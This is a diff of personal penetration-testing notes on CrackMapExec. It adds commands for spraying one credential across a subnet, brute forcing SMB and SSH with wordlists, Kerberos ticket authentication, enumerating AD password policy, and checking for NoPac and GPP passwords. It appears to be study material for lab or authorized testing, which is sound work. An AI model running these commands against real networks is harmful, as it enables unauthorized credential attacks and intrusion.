@@ -12,34 +12,46 @@ Search Tag: #📖
 
 # [[CrackMapExec]]  
 
-## Kerberos Auth 
+Can be used to test creds on an entire network:
+```
+crackmapexec smb 10.10.110.0/24 -u mrb3n W3lc0me123!!!
+```
+
+Can also be used to brute force (smb, mssql, winrm, ldap, ssh):
+```
+crackmapexec smb 172.16.1.1/24 -u user.txt -p pass.txt
+
+crackmapexec ssh 172.16.1.1/24 -u user.txt -p pass.txt
+```
+
+### Kerberos Auth 
 For kerberos, use the latest CrackMapExec (>= 5.2.3)
 ```bash
 export KRB5CCNAME=/path/to/ticket.kirbi
 cme smb <ip> -d <DOMAIN> -u <USER> -k 
 ```
-## Enumerate Password Policy
+### Enumerate Password Policy
 
 ```bash
 cme --verbose smb -d <DOMAIN> -u <USER> --pass-pol <DC-IP>
 ```
 
-## Enumerate Machine Account Quota 
+### Enumerate Machine Account Quota 
 ```bash 
 cme --verbose ldap <dc-ip> -d -u -M maq
 ```
 
-## Check for NoPac (CVE-2021-42278 | CVE-2021-42287)
+### Check for NoPac (CVE-2021-42278 | CVE-2021-42287)
 ```bash
 crackmapexec --verbose smb <dc-ip> -u '<user>' -p '<pass>' -M nopac
 ```
 
-## Scan for WebDAV Systems
+### Scan for WebDAV Systems
 ```bash 
 crackmapexec smb <target-list.txt> -u 'user' -p 'pass' -M webdav
 ```
 
-## GPP Password 
+### GPP Password 
 ```bash 
 crackmapexec smb <dc-ip> -u 'user' -p 'pass' -M gpp_password
 ```
